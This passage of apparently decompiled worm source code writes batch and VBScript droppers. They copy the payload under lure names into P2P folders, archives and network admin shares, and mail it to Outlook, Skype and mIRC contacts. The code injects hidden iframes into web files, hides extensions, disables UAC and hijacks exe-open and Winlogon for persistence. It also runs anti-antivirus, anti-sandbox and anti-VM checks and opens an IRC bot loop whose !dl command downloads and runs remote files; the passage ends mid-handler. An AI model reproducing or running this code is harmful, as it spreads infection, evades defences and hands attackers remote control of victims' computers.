			streamWriter6.WriteLine("echo Flyff_PS.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Porn_Jessica_Alba.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Jessica_alba_screensaver.scr >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo win_mediaplayer_11.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Cheatgenerator.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo PhotoshopCS3.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo yourmother.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo irc_bot_source.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo vb.net_ultra_worm.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo VB6_install.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Limewire_pro.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo ICQ_hacker.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo become_hacker.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Hacking.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo How_to_hack.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Youtube_video_converter.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Emule_speedup.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Windows_faster_tutorial.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Rapidshare_account.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo WOW_account.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo callofduty.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo \"how to be an hacker.pif\" >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo callofduty6.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo callofduty5.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo callofduty4.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo callofduty3.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo cod6.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo starcraft.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo starcraft_ghost.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo yugioh.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Conficker_source.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Conficker_removal.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo exploit_pack.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo allexploits.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Const olByValue = 1 >%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo Const olMailItem = 0 >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo Dim oOApp >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo Dim oOMail >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo oOApp = CreateObject(\"Outlook.Application\") >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo oOMail = oOApp.CreateItem(olMailItem) >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo With oOMail >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo .To = \"%username%@hotmail.com\" >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo .Subject = \"HEY\" >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo .Body = \"Hello , could you take a look over my picture i have taken some days ago?\" >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo .Attachments.Add \"C:\\WINDOWS\\system32\\dllcache\\recycled.exe\", olByValue, 1 >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo .Send() >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("echo End With >>%windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("start %windir%\\system32\\pbrl.vbs");
			streamWriter6.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"HideFileExt\" /t \"REG_DWORD\" /d 1 /f");
			streamWriter6.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"Hidden\" /t \"REG_DWORD\" /d 2 /f");
			streamWriter6.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoFind\" /t \"REG_DWORD\" /d 1 /f");
			streamWriter6.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoFolderOptions\" /t \"REG_DWORD\" /d 1 /f");
			streamWriter6.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"SuperHidden\" /t \"REG_DWORD\" /d 0 /f");
			streamWriter6.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"ShowSuperHidden\" /t \"REG_DWORD\" /d 0 /f");
			streamWriter6.WriteLine("dir /s /ad /b * >%windir%\\teemp.txt");
			streamWriter6.WriteLine("start C:\\windows\\system32\\net.vbs");
			streamWriter6.WriteLine("ping localhost -n 2");
			streamWriter6.WriteLine("for /f %%t in (C:\\windows\\system32\\logg.txt) do (");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %%t\\readme.scr ");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine("if exist \"%programfiles%\\WINRAR\\WinRAR.exe\" (");
			streamWriter6.WriteLine("set r = \"%programfiles%\\WINRAR\\WinRAR.exe\"");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe C:\\start.exe /f");
			streamWriter6.WriteLine("dir /s /ad /b * >%windir%\\tmp.log");
			streamWriter6.WriteLine("for /f %%l in (%windir%\\tmp.log) do (");
			streamWriter6.WriteLine("for %%o in (%%l\\*.rar) do (");
			streamWriter6.WriteLine("%r% a -ibck -y %%o C:\\start.exe");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine("for %%k in (%%l\\*.zip) do (");
			streamWriter6.WriteLine("%r% a -ibck -y %%k C:\\start.exe");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine("dir /s /ad /b *shar* >%windir%\\temp.dat");
			streamWriter6.WriteLine("for /f %%n in (%windir%\\temp.dat) do (");
			streamWriter6.WriteLine("copy C:\\start.exe %%n\\windows_7_full.exe /f");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine("For /f %%h in (%windir%\\teemp.txt) do (");
			streamWriter6.WriteLine("echo ^<iframe src=\"" + link + "\" width=0 height=0^>^</iframe^> >>\"%%h\"\\*.htm");
			streamWriter6.WriteLine("echo ^<iframe src=\"" + link + "\" width=0 height=0^>^</iframe^> >>\"%%h\"\\*.html");
			streamWriter6.WriteLine("echo ^<iframe src=\"" + link + "\" width=0 height=0^>^</iframe^> >>\"%%h\"\\*.php");
			streamWriter6.WriteLine("echo ^<iframe src=\"" + link + "\" width=0 height=0^>^</iframe^> >>\"%%h\"\\*.js");
			streamWriter6.WriteLine("echo ^<iframe src=\"" + link + "\" width=0 height=0^>^</iframe^> >>\"%%h\"\\*.hta");
			streamWriter6.WriteLine("if exist %windir%\\system32\\tmp.dll type %windir%\\system32\\tmp.dll >>%%h\\*.html");
			streamWriter6.WriteLine("if exist %windir%\\system32\\tmp.dll type %windir%\\system32\\tmp.dll >>%%h\\*.htm");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine("set /a num=%random%%%20+1");
			streamWriter6.WriteLine("ping 192.168.1.%num%");
			streamWriter6.WriteLine("ping 192.168.%num%.%num%");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.1.%num%\\C$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.%num%.%num%\\C$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.1.%num%\\IPC$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.%num%.%num%\\IPC$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.1.%num%\\Admin$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.%num%.%num%\\Admin$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.1.%num%\\d$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.%num%.%num%\\d$\\funny.scr");
			streamWriter6.WriteLine("set /a bloo=%random%%%255+1");
			streamWriter6.WriteLine("ping 192.168.1.%bloo%");
			streamWriter6.WriteLine("ping 192.168.%bloo%.%bloo%");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.1.%bloo%\\C$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.%num%.%bloo%\\C$\\funny.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\BearShare\\Shared\\ea-keygen.exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\eDonkey2000\\incoming\\britney_spears_naked.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\eMule\\Incoming\\battlefield2-3.exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\gnucleus\\downloads\\incoming\\wormgenerator.exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\grokster\\my grokster\\virusgen.exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\icq\\shared files\\C&C_all.exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\KaZaa Lite\\My Shared Folder\\best_porn.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\KaZaa\\My Shared Folder\\virtual_girls_all.scr");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\Morpheus\\my shared folder\\icq_unlimited.exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\StreamCast\\Morpheus\\my shared folder\\windows_vista.exe");
			streamWriter6.WriteLine("for /f %%b in (%windir%\\system32\\13l.dll) do (");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\BearShare\\Shared\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\eDonkey2000\\incoming\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\eMule\\Incoming\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\gnucleus\\downloads\\incoming\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\grokster\\my grokster\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\icq\\shared files\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\KaZaa Lite\\My Shared Folder\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\KaZaa\\My Shared Folder\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\Morpheus\\my shared folder\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\StreamCast\\Morpheus\\my shared folder\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe  C:\\My Downloads\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\direct connect\\received files\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\gnucleus\\downloads\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\grokster\\my shared folder\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\KMD\\my shared folder\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\limeWire\\shared\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\StreamCast\\Morpheus\\my shared folder\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\XPCode\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe C:\\Inetpub\\ftproot\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe C:\\appserv\\www\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe C:\\%programfiles%\\appserv\\www\\%%b");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			streamWriter6.WriteLine("dir /s /ad /b" + folderPath + "* >>%windir%\\system32\\tomp.txt");
			streamWriter6.WriteLine("for %%o in (%windir%\\system32\\tomp.txt) do (");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %%o\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %%o\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %%o\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %%o\\%%b");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %%o\\%%b");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.1.%bloo%\\C$\\" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe \\\\192.168.%num%.%bloo%\\C$\\funny.scr" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\BearShare\\Shared\\ea-keygen.exe" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\eDonkey2000\\incoming\\britney_spears_naked.scr" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\eMule\\Incoming\\battlefield2-3.exe" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\gnucleus\\downloads\\incoming\\wormgenerator.exe" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\grokster\\my grokster\\virusgen.exe" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\icq\\shared files\\C&C_all.exe" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\KaZaa Lite\\My Shared Folder\\best_porn.scr" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\KaZaa\\My Shared Folder\\virtual_girls_all.scr" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\Morpheus\\my shared folder\\icq_unlimited.exe" + text + ".exe");
			streamWriter6.WriteLine("copy C:\\WINDOWS\\system32\\dllcache\\recycled.exe %programfiles%\\StreamCast\\Morpheus\\my shared folder\\windows_vista.exe" + text + ".exe");
			streamWriter6.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"ImagePath\" /t \"REG_EXPAND_SZ\" /d \"C:\\windows\\system32\\drivers\\svchost.exe\" /f");
			streamWriter6.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"DisplayName\" /d \"Default Windows Firewall\" /f");
			streamWriter6.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"ObjectName\"  /d \"LocalSystem\" /f");
			streamWriter6.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"Start\" /t REG_DWORD /d \"2\" /f");
			streamWriter6.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"ErrorControl\" /t REG_DWORD /d \"0\" /f");
			streamWriter6.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"Type\" /t REG_DWORD /d \"110\" /f");
			streamWriter6.WriteLine("reg add  \"HKEY_CURRENT_USER\\Software\\Patchou\\Messenger Plus! Live\\GlobalSettings\\Scripts\\MSN PLUS\" /v background /d " + link + "/f");
			streamWriter6.WriteLine("reg add \"HKEY_CURRENT_USER\\Identities\\Software\\Microsoft\\Outlook Express\\5.0\\signatures\" /v \"Default Signature\" /d " + link + "/f");
			streamWriter6.WriteLine("if exist \"%programfiles%\\Autoit3\\Include\\*.au3\" (");
			streamWriter6.WriteLine("echo InetGet(\"" + link + "\", \"%windir%\\system32\\sys.bat\", 1, 0) >>%programfiles%\\Autoit3\\Include\\*.au3");
			streamWriter6.WriteLine("echo run(\"%winidr%\\system32\\sys.bat\") >>%programfiles%\\Autoit3\\Include\\*.au3");
			streamWriter6.WriteLine(")");
			streamWriter6.WriteLine("echo ftp 192.168.1.%bloo% >%windir%\\ftp");
			streamWriter6.WriteLine("anonymous >>%windir%\\ftp");
			streamWriter6.WriteLine("password >>%windir%\\ftp");
			streamWriter6.WriteLine("put C:\\WINDOWS\\system32\\dllcache\\doc.pif >>%windir%\\ftp");
			streamWriter6.WriteLine("echo quit >>%windir%\\ftp");
			streamWriter6.WriteLine("ftp -s:%windir%\\ftp");
			streamWriter6.WriteLine("del C:\\start.exe");
			streamWriter6.Close();
			Process.Start("C:\\windows\\system32\\launch.vbs");
			FileStream stream6 = new FileStream("C:\\windows\\system32\\s4c.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter7 = new StreamWriter(stream6);
			streamWriter7.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter7.WriteLine("on error resume next");
			streamWriter7.WriteLine("set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")");
			streamWriter7.WriteLine("Fruxr.Client.Start()");
			streamWriter7.WriteLine("Fruxr.Attach()");
			streamWriter7.WriteLine("For Each KZN In Fruxr.Friends ");
			streamWriter7.WriteLine("Fruxr.SendMessage KZN.handle,\"lol me hot " + link + "\"");
			streamWriter7.WriteLine("next");
			streamWriter7.WriteLine("Dim x");
			streamWriter7.WriteLine("On Error Resume Next");
			streamWriter7.WriteLine("fso = \"Scripting.FileSystem.Object\"");
			streamWriter7.WriteLine("so = CreateObject(fso)");
			streamWriter7.WriteLine("ol = CreateObject(\"Outlook.Application\")");
			streamWriter7.WriteLine("out = WScript.CreateObject(\"Outlook.Application\")");
			streamWriter7.WriteLine("mapi = out.GetNameSpace(\"MAPI\")");
			streamWriter7.WriteLine("a = mapi.AddressLists(1)");
			streamWriter7.WriteLine("For x = 1 To a.AddressEntries.Count");
			streamWriter7.WriteLine("Mail = ol.CreateItem(0)");
			streamWriter7.WriteLine("Mail.to = ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x)");
			streamWriter7.WriteLine("Mail.Subject = \"Hi\"");
			streamWriter7.WriteLine("Mail.Body = \"Hello , i sent you the document , i had to correct, it was really nice but many failures\"");
			streamWriter7.WriteLine("Mail.Attachments.Add(\"C:\\WINDOWS\\system32\\dllcache\\doc.pif\")");
			streamWriter7.WriteLine("Mail.Send()");
			streamWriter7.WriteLine("Next");
			streamWriter7.WriteLine("ol.Quit()");
			streamWriter7.WriteLine("Dim mirc");
			streamWriter7.WriteLine("fso = CreateObject(\"Scripting.FileSystemObject\")");
			streamWriter7.WriteLine("mirc = fso.CreateTextFile(\"" + ProgrammFiles + "\\mirc\\script.ini\")");
			streamWriter7.WriteLine("fso.CopyFile Wscript.ScriptFullName, \"C:\\WINDOWS\\system32\\dllcache\\myporn.scr\", True ");
			streamWriter7.WriteLine("mirc.WriteLine \"[script]\"");
			streamWriter7.WriteLine("mirc.WriteLine \"n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\\WINDOWS\\system32\\dllcache\\doc.pif } \"");
			streamWriter7.WriteLine("mirc.Close");
			streamWriter7.Close();
			Process.Start("C:\\windows\\system32\\s4c.vbs");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\MessengerService\\Policies", "IMWarning", (object)("(M)Warning: The person who you are talking to is infected with a virus. Send him the removal tool that can be found in" + link));
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "@", (object)"C:\\windows\\system32\\drivers\\svchost.exe \"\\%1\\\" %*");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"2");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Yahoo\\pager\\View\\YMSGR_buzz", "content url", (object)link);
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object)"0");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object)"1");
			P2Pspread();
			MSN_Share_drop();
			try
			{
				msn_spread();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			killall();
			Antis.antiKAV();
			Antis.AntiWireShark();
			Antis.antiSandboxie();
			Antis.antiAnubis();
			Antis.antiAnubis2();
			Antis.AntiVirtualBox();
			Antis.AntiVmWare();
			Antis.AntiVirtualPC();
			try
			{
				if (!File.Exists(Path.GetTempPath() + "win_update.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + "win_update.exe");
				}
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", (object)"explorer.exe, C:\\windows\\system32\\drivers\\svchost.exe");
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "shell", (object)"explorer.exe, C:\\windows\\system32\\drivers\\svchost.exe");
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", (object)("C:\\WINDOWS\\SYSTEM32\\Userinit.exe," + Path.GetTempPath() + "win_update.exe"));
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			while (true)
			{
				try
				{
					Console.ReadLine();
					ircbot.irc = new TcpClient(ircbot.SERVER, ircbot.PORT);
					ircbot.IRCstream = ircbot.irc.GetStream();
					ircbot.IRCreader = new StreamReader(ircbot.IRCstream);
					ircbot.IRCwriter = new StreamWriter(ircbot.IRCstream);
					ircbot.IRCwriter.WriteLine("USER go go gadget go :gay");
					ircbot.IRCwriter.Flush();
					ircbot.IRCwriter.WriteLine("NICK " + ircbot.NICK);
					ircbot.IRCwriter.Flush();
					while (true)
					{
						if (ircbot.Inline(ref ircbot.inputLine, ircbot.IRCreader.ReadLine()) != null)
						{
							if (ircbot.inputLine.Contains("PING :"))
							{
								int startIndex = ircbot.inputLine.IndexOf("PING :");
								string text2 = new string(Conversions.ToCharArrayRankOne(ircbot.inputLine.Substring(startIndex)));
								string text3 = new string(Conversions.ToCharArrayRankOne(text2.Replace("PING :", string.Empty)));
								ircbot.IRCwriter.WriteLine("PONG :" + text3);
								ircbot.IRCwriter.Flush();
							}
							ircbot.IRCwriter.WriteLine("JOIN " + ircbot.CHANNEL);
							ircbot.IRCwriter.Flush();
							if (ircbot.inputLine.Contains("!dl"))
							{
								try
								{
									bla = ircbot.inputLine.Split(new char[1] { ' ' });
									WebClient webClient = new WebClient();
									int startIndex2 = ircbot.inputLine.IndexOf("http://");
									ircbot.inputLine.Substring(startIndex2);
									object[] array2 = new object[2];
									object[] array3 = array2;
									Array array4 = bla;
									object[] array5 = new object[1];
									object[] array6 = array5;
									int num = 1;
									array6[0] = 1;
									array3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array4, array5, (string[])null));
									array2[1] = Path.GetTempPath() + ircbot.Rand1;
									object[] array7 = array2;
									object[] array8 = array7;
									bool[] array9 = new bool[2] { true, false };
									NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadFile", array8, (string[])null, (Type[])null, array9, true);
									if (array9[0])
									{
										NewLateBinding.LateIndexSetComplex((object)bla, new object[2]
										{
											num,
											RuntimeHelpers.GetObjectValue(array7[0])
										}, (string[])null, true, false);
									}
									ProcessStartInfo startInfo = new ProcessStartInfo(Path.GetTempPath() + ircbot.Rand1);
									Process.Start(startInfo);
									ircbot.IRCwriter.WriteLine(Operators.AddObject(Operators.AddObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat("PRIVMSG " + ircbot.CHANNEL, " :"), " "), "\u0003"), "9 downloaded "), NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)), (object)" and executed in : "), (object)Path.GetTempPath()), (object)ircbot.Rand1));
									ircbot.IRCwriter.Flush();
								}
								catch (Exception projectError14)
								{
									ProjectData.SetProjectError(projectError14);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!infos"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u00039 My OS is : " + Environment.OSVersion.ToString() + ", My Username is :  " + Environment.UserName.ToString() + " , and my uptime in seconds is : " + Environment.Version.ToString() + "my network IP:" + nameho + "my version:" + version);
									ircbot.IRCwriter.Flush();
								}
								catch (Exception projectError15)
								{
									ProjectData.SetProjectError(projectError15);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!p2p"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003Started p2p spreading routine");
									P2Pspread();
									ircbot.IRCwriter.Flush();
								}
								catch (Exception projectError16)
								{
									ProjectData.SetProjectError(projectError16);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!msnshare"))
							{
								try
								{
